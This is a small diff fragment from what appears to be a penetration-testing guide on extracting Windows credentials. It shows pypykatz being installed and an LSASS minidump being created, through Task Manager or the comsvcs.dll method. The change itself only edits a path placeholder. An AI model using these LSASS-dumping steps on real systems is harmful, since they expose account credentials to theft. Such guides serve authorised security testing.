@@ -21,7 +21,7 @@ sudo apt install python3-pypykatz
 **Create the LSASS minidump on the target (Windows):**
 ```powershell
 # Task Manager method: Details → right-click lsass.exe → "Create dump file"
-# (saved to C:\Users\<user>\AppData\Local\Temp\lsass.DMP)
+# (saved to C:\Users\$Username\AppData\Local\Temp\lsass.DMP)
 
 # Or via comsvcs.dll (admin cmd/PowerShell):
 $lsasspid = (Get-Process lsass).Id
